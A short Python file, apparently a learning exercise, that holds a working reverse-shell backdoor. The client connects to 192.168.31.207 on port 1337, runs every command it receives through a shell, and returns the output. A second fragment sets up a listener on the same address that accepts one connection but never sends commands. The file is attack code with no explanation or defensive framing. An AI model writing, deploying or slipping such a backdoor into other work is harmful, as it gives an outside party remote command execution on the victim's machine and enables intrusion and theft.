#!/usr/bin/env python3
import socket
import subprocess


def execute_system_command(command):
    return subprocess.check_output(command, shell=True)


c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect(("192.168.31.207", 1337))

c.send("\n[+] Connection has been established.\n".encode('utf-8'))

while True:
    cmd = c.recv(1024).decode('utf-8')
    cmd_result = execute_system_command(cmd)
    c.send(cmd_result)

c.close()

#####################
import socket


lst = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
lst.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
lst.bind(("192.168.31.207", 1337))
lst.listen(5)
print("[+] Waiting for incoming connection.")
lst.accept()
print("[+] Connection has been established.")
